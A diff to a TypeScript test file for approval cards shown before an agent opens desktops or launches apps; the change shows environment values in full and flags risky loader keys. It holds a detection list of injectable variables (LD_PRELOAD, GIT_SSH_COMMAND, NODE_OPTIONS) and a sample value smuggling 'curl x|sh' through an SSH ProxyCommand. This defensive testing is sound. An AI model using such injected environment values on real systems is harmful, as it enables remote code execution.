@@ -1,7 +1,7 @@
 /**
  * get_desktops / control_desktop (unified MCP design 2026-10-15 §4 rows 40–41, ruling S4): the
  * ported desktop tool behaviour over the desktop routes (a FakeDaemonApi), and the chat tiers —
- * open/launch_app Admin with the card naming command, cwd and env keys; stop_app, close_window and
+ * open/launch_app Admin with the card naming command, cwd and every env value in full; stop_app, close_window and
  * close Act — through the executor and the approval-port double.
  */
 import { test } from "node:test";
@@ -15,6 +15,7 @@ import { FakeApprovalPort } from "../catalog/approval-double.ts";
 import type { ThreadCaller } from "../catalog/contract.ts";
 import { audienceSchema, executeToolCall } from "../executor.ts";
 import { FakeDaemonApi } from "../testing.ts";
+import { desktopPreview, isLoaderEnvKey } from "./desktop-preview.ts";
 import { desktopsFamily } from "./desktops.ts";
 
 const ROOT = realpathSync(mkdtempSync(join(tmpdir(), "mcp-desktop-")));
@@ -172,7 +173,7 @@ test("control_desktop launch_app, stop_app (force=1 only when forced), close_win
 
 // --- Chat tiers (ruling S4) ----------------------------------------------------------------------
 
-test("chat: open and launch_app are Admin — a card naming the command, the working directory and the env keys, never their values", async () => {
+test("chat: open and launch_app are Admin — a card naming the command, the working directory and every env value in full", async () => {
   const api = fakeApi().on("POST", "/api/desktops", { status: 200, body: desktop() }).on("POST", "/api/desktops/dt-1/apps", { status: 200, body: app() });
   const port = new FakeApprovalPort();
   await value(api, "control_desktop", { action: "open", command: "./run.sh", cwd: "bin", env: { TOKEN: "s3cret", LD_PRELOAD: "/tmp/x.so" }, reason: "to test the UI" }, chat({ runtimeMode: "approval-required" }), port);
@@ -182,9 +183,19 @@ test("chat: open and launch_app are Admin — a card naming the command, the wor
   assert.equal(card.reason, "to test the UI");
   assert.match(card.title, /open a desktop in acme\/game/);
   const text = JSON.stringify(card.sections);
-  assert.ok(text.includes("./run.sh") && text.includes(join(GAME, "bin")) && text.includes("TOKEN") && text.includes("LD_PRELOAD"));
-  assert.ok(!text.includes("s3cret") && !text.includes("/tmp/x.so"), "env values are not shown");
-  assert.ok(card.sections.some((section) => section.kind === "warning"), "a loader key is flagged");
+  assert.ok(text.includes("./run.sh") && text.includes(join(GAME, "bin")));
+  const envSection = card.sections.find((section) => section.kind === "fields" && section.title === "Environment");
+  assert.deepEqual(envSection, {
+    kind: "fields",
+    title: "Environment",
+    rows: [
+      { label: "LD_PRELOAD", value: "/tmp/x.so" },
+      { label: "TOKEN", value: "s3cret" }
+    ]
+  }, "every env value is shown in full (the agent wrote it)");
+  const warning = card.sections.find((section) => section.kind === "warning");
+  assert.ok(warning && warning.kind === "warning" && warning.text.startsWith("LD_PRELOAD changes"), "a loader key is named in the warning");
+  assert.ok(!warning.text.includes("TOKEN"), "a plain key is not");
   assert.deepEqual(card.grantOptions, [], "grants only for Full access");
   assert.deepEqual(api.calls.find((c) => c.method === "POST")!.body, { projectPath: GAME, app: { command: "./run.sh", cwd: "bin", env: { TOKEN: "s3cret", LD_PRELOAD: "/tmp/x.so" } } });
   // Full access: grant options for the caller's project; a desktops grant then covers the next launch.
@@ -227,4 +238,37 @@ test("chat: another workspace's desktops are a metadata read (card below Full ac
   assert.equal(port.cards.length, 1, "same workspace metadata: no card");
   await value(api, "get_desktops", { desktopId: "dt-1", appId: "app-1" }, chat({ runtimeMode: "approval-required" }), port);
   assert.equal(port.cards.length, 1, "own project content: no card");
+});
+
+test("desktop card: the loader-key warning covers loaders, runtimes, shells, git hooks and GUI plugins; values stay in full", () => {
+  for (const key of [
+    "LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "PATH", "GIT_SSH_COMMAND", "GIT_EXEC_PATH", "GIT_CONFIG_KEY_0",
+    "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "PROMPT_COMMAND", "BASH_ENV", "ENV", "ZDOTDIR", "DOTNET_STARTUP_HOOKS", "ELECTRON_RUN_AS_NODE",
+    "PYTHONSTARTUP", "PYTHONPATH", "PERL5OPT", "RUBYOPT", "NODE_PATH", "NODE_OPTIONS", "GTK_MODULES", "QT_PLUGIN_PATH"
+  ]) {
+    assert.ok(isLoaderEnvKey(key), key);
+  }
+  for (const key of ["TOKEN", "vblank_mode", "LP_NUM_THREADS", "HOME_DIR", "path", "MY_PATH", "LDFLAGS"]) assert.ok(!isLoaderEnvKey(key), key);
+  const card = desktopPreview({
+    action: "launch_app",
+    agentId: "claude",
+    projectLabel: "acme/game",
+    desktop: { id: "dt-1", title: "Editor", apps: [], windows: [] },
+    command: "xterm",
+    env: { GIT_SSH_COMMAND: "ssh -i /tmp/key -o ProxyCommand='curl x|sh'", ELECTRON_RUN_AS_NODE: "1", LONG: "v".repeat(5_000) }
+  });
+  const env = card.sections.find((section) => section.kind === "fields" && section.title === "Environment");
+  assert.ok(env && env.kind === "fields");
+  assert.deepEqual(env.rows.map((row) => [row.label, row.value]), [
+    ["ELECTRON_RUN_AS_NODE", "1"],
+    ["GIT_SSH_COMMAND", "ssh -i /tmp/key -o ProxyCommand='curl x|sh'"],
+    ["LONG", "v".repeat(5_000)]
+  ]);
+  assert.ok(env.rows.every((row) => row.state === undefined), "no row is mislabelled as a secret");
+  const warning = card.sections.find((section) => section.kind === "warning");
+  assert.ok(warning && warning.kind === "warning");
+  assert.match(warning.text, /^ELECTRON_RUN_AS_NODE, GIT_SSH_COMMAND change which program/);
+  // No env: no Environment section, no warning.
+  const plain = desktopPreview({ action: "launch_app", agentId: "claude", projectLabel: "acme/game", command: "xterm" });
+  assert.ok(!plain.sections.some((section) => (section.kind === "fields" && section.title === "Environment") || section.kind === "warning"));
 });
